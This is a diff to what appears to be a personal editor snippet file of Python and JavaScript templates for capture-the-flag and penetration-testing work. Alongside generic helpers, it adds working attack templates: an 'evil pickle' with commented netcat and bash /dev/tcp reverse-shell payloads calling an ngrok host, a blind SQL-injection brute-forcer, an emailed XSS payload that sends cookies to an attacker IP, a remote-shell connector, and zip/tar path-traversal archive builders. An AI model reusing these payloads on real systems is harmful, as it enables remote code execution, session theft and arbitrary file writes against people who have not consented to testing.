@@ -2,8 +2,8 @@ snippet lj
 	${1:string}.ljust(${2:1337}, '${3:A}')
 
 snippet regex
-	match = re.search(r'${0:Needle: (.*)})', ${1:haystack})
-	if match: found = unpack(match.group(1))
+	if (match := re.search(r'${0:Needle: (.*)}', ${1:haystack})):
+		found = unpack(match.group(1))
 
 snippet bf "generic bruteforce loop, no multithreading"
 	from itertools import product
@@ -12,7 +12,7 @@ snippet bf "generic bruteforce loop, no multithreading"
 	import sys
 	#import hashlib
 
-	alphabet = string.printable #string.ascii_uppercase #string.ascii_lowercase
+	alphabet = string.printable #string.ascii_letters
 
 	for i in range(1, 10):
 		for curr in product(alphabet, repeat = i):
@@ -423,9 +423,161 @@ snippet angrop
 
 	chain.print_payload_code()
 
+snippet arg "quick and dirty, no argparse"
+	import sys
+	${1:foo}, ${2:bar} = sys.argv[1:]
+
+snippet proc
+	import subprocess
+	proc = subprocess.run(["${1:cmd}", "${2:arg1}"], stdout=subprocess.PIPE)
+	if proc.returncode:
+		raise
+	print(proc.stdout)
+
+snippet overwrite
+	allow_overwrite = "";
+	if os.path.isfile(filename := "${1:./foo.js}"):
+		 allow_overwrite = input(f"{filename} already exists. Overwrite? (Y/n)\n")
+	if allow_overwrite.lower() != "n":
+		 log.warn("Writing to {filename}");
+		 with open(filename, "w") as f:
+			  f.write(${2:"asdf"});
+
+snippet fw "file write"
+	if not os.path.exists((subdir := ${1:"foo"})):
+		os.makedirs(subdir)
+	with open((filename := f"{subdir}/${2:bar.txt}"), 'w') as f:  # wb to write bytes
+		f.write(${3:"asdf"})
+
+snippet fileit "iterate through file"
+	with open("foo.txt", "r") as f:
+		for line in f:
+			$0
+
+snippet stb "string to bytestring (b-string)"
+	str.encode(${0:"asdf"})
+
+snippet bts "bytestring to string"
+	str(${0:b"asdf"}, 'utf-8')
+
+snippet b64
+	from base64 import b64encode as b64e, b64decode as b64d
+
+snippet unpickle "b64-encoded pickle to object"
+	import pickle
+	from base64 import b64encode as b64e, b64decode as b64d
+	unpickled = pickle.loads(b64d(${0:'gA=='}))
+
+snippet pickle "object to b64 encoded pickle"
+	import pickle
+	from base64 import b64encode as b64e, b64decode as b64d
+	pickled = str(b64e(pickle.dumps(${0:object}, protocol=3)), 'utf-8')
+
+snippet badpickle "evil pickle"
+	class Evil():
+		 def __reduce__(_):
+			  import os
+			  return (os.system, ("sleep 2",))  # probe: expected response time ~2s if successful
+			  #return (os.system,("netcat -c '/bin/bash -i' -l -p 1234",))  # execute, then nc victim 1234
+			  #return (os.system,("/bin/bash -c 'bash -i > /dev/tcp/4.tcp.ngrok.io/10302 0>&1'",))  # nc -lvp 1234, then execute
+	evil = str(b64e(pickle.dumps(Evil(), protocol=3)), 'utf-8')  # downgrade protocol for py2 🥒
+
+snippet bg "Usage: put @bg above any func defn"
+	def bg(f):
+		def wrapped(*args, **kwargs):
+			import asyncio, concurrent.futures
+			return asyncio.get_event_loop().run_in_executor(concurrent.futures.ThreadPoolExecutor(max_workers=100), f, *args, *kwargs)
+		return wrapped
+
+snippet loop "async loop, use if bottleneck is io AND you need to use the results"
+	import asyncio, concurrent.futures
+	def bg(f):
+		def wrapped(*args, **kwargs):
+			return asyncio.get_event_loop().run_in_executor(concurrent.futures.ThreadPoolExecutor(max_workers=100), f, *args, *kwargs)
+		return wrapped
+
+	async def main():
+		@bg
+		def ${1:action}(i):
+			response = sesh.get(url)
+			return response
+
+		tasks = []
+		${2:items} = []
+		for i in $2:
+			tasks.append($1(i))
+		results = await asyncio.gather(*tasks)
+		return results
+
+	results = asyncio.run(main())
+	print(results)
+
+snippet abf "async bestforce"
+	import asyncio, concurrent.futures
+	def bg(f):
+		def wrapped(*args, **kwargs):
+			return asyncio.get_event_loop().run_in_executor(concurrent.futures.ThreadPoolExecutor(max_workers=100), f, *args, *kwargs)
+		return wrapped
+
+	async def main():
+		@bg
+		def probe(char, url, data, method: str = 'GET'):
+			url, data = (x.replace("FUZZ", char) for x in (url, data))
+			log.info(f"Probe: {data}")
+			response = sesh.request(method, url, params=parse_qs(data))  # use params, data, or json
+			size = len(response.content)
+			log.debug(f"Received response, size: {size}")
+			return char if size > 2229 else None
+
+		tasks = []
+		import string
+		alphabet = string.printable.replace("%", "")#.replace("_", "")
+		for i in alphabet:
+			payload = f"{prefix}FUZZ%}}'"
+			tasks.append(probe(i, url, payload))
+		results = await asyncio.gather(*tasks)
+		return results
+
+	prefix = "id=1 OR (select content from flag5) like 'HTB{"
+	while (results := [x for x in asyncio.run(main()) if x]):
+		log.info(results)
+		prefix += results[0]
+	log.info(prefix)
+
 #TODO: make snippets for web
-snippet post
+snippet wpn "generic Web PwN snippet"
+	import logging as log  # so i can reuse pwnlib.log snippets
+	DEFAULT_LOGLEVEL = log.INFO
+	log.basicConfig(level=DEFAULT_LOGLEVEL, format="[%(levelname)s][%(filename)s:%(lineno)s - %(funcName)s()] %(message)s")
+	[log.addLevelName(l, f"{s}\033[1;0m") for l,s in {log.INFO: "\033[0;34m*", log.WARNING: "\033[1;33m!", log.ERROR: "\033[0;41mERROR", log.CRITICAL: "\033[0;41mCRITICAL"}.items()]
+
 	import requests
+	requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+
+	sesh = requests.Session()
+	from http.cookies import BaseCookie
+	sesh.cookies = requests.utils.cookiejar_from_dict({k:m.value for k,m in BaseCookie('').items()})
+	sesh.headers = requests.utils.default_headers()
+	#sesh.proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
+	if not sesh.proxies: log.warn("Proxying off.")
+	sesh.verify = False
+	sesh.mount('http://', requests.adapters.HTTPAdapter(pool_maxsize=100))
+
+	url = "${1:https://}"
+	from urllib.parse import parse_qs
+	payload = parse_qs('')
+	log.info("Iniciando el hackeo.")
+	response = sesh.get(url, params=payload)
+	#response = sesh.post(url, ${2:data|json}=payload)
+
+	log.info(f"Response code: {response.status_code}")
+	#response.raise_for_status()
+	log.info(f"Response text:\n{response.text}")
+	#log.info(f"Response json:\n{response.json}")
+	log.info("End of response.")
+
+snippet post
+	#import requests
 	url = "${1:https://}"
 	body = {} 
 	#cookies = {} # or use requests.Session()
@@ -436,7 +588,7 @@ snippet post
 	#print(response.json())
 
 snippet get
-	import requests
+	#import requests
 	url = "${1:https://}"
 	#payload = {}
 	#cookies = {} # or use requests.Session()
@@ -446,9 +598,92 @@ snippet get
 	#print(response.text)
 	#print(response.json())
 
-snippet proc
-	import subprocess
-	proc = subprocess.run(["${1:cmd}", "${2:arg1}"], stdout=subprocess.PIPE)
-	if proc.returncode:
-		raise
-	print(proc.stdout)
+snippet prep "useful for ../, based on stackoverflow.com/a/63422105"
+	(prep := requests.Request('GET',':').prepare()).url = url
+	response = sesh.send(prep)
+
+snippet connect "for connecting to a direct remote shell on victim nc server, sans pwntools&retry"
+	from telnetlib import Telnet
+	for i in range(3):
+		try:
+			with Telnet('${0:172.16.103.142}', ${1:1234}) as t:
+			log.info("🧦 Connection established")
+			t.interact()
+			log.info("🧦 Closing connection")
+			break
+		except ConnectionRefusedError:
+			log.warn("🧦 Connection failed, retrying...")
+			import time
+			time.sleep(1)
+
+snippet mail
+	import logging as log  # so i can reuse pwnlib.log snippets
+	log.basicConfig(level=log.INFO, format="[%(levelname)s][%(filename)s:%(lineno)s - %(funcName)s()] %(message)s")
+	[log.addLevelName(l, f"{s}\033[1;0m") for l,s in {log.INFO: "\033[0;34m*", log.WARNING: "\033[1;33m!", log.ERROR: "\033[0;41mERROR", log.CRITICAL: "\033[0;41mCRITICAL"}.items()]
+
+	import smtplib
+
+	def sendMail(payload):
+		 sender = "attacker@offsec.local"
+		 recipient = "admin@offsec.local"
+		 date = payload
+		 subject = "AAAAAAAAAAA"
+		 body = "BBBBBBBBBBB"
+		 msg = f"""From: {sender}
+	To: {recipient}
+	Date: {date}
+	Subject: {subject}
+	Content-type: text/html
+
+	{body}\r\n\r\n"""
+
+		 from smtplib import SMTP
+		 with SMTP("atmail") as smtp:
+			  #smtp.login(username,password)
+			  log.info("Sending email...")
+			  smtp.sendmail(sender, recipient, msg)
+			  log.info("Email sent!")
+
+	sendMail("<script>document.location='http://192.168.119.137:1337/'+document.cookie</script>")
+
+snippet fetch
+	function log(response) {
+		if (!response.ok) throw Error(response.statusText);
+		else response.text().then(data => {
+			console.log(\`Request to ${response.url} returned content:\n${data}\`);
+		});
+		return response;
+	}
+	
+	fetch("${1:http://httpstat.us}", {
+	}).then((r1) => {
+		log(r1);
+	})
+
+snippet mash "everything onto one line, useful for js perhaps"
+	str.replace(r"""
+	<script>
+	console.log('foo\nbar');
+	</script>
+	""", '\n', '')
+
+snippet zip "dir traversal zip"
+	import zipfile
+	from cStringIO import StringIO
+
+	f = StringIO()
+	with zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED) as z:
+		z.writestr('../../../../../tmp/poc/poc.txt', 'gottem')
+	with open('poc.zip', 'wb') as zip:
+		zip.write(f.getvalue())
+
+snippet tgz "dir traversal tgz"
+	import tarfile
+	import StringIO
+
+	with tarfile.Tarfile("poc.tgz","w:gz") as tar:
+		string = StringIO.StringIO("gottem")
+		info = tarfile.TarInfo(name="../../../../../tmp/poc/poc.txt")
+		info.size = len(string.buf)
+		tar.addfile(tarinfo=info, fileobj=string)
+
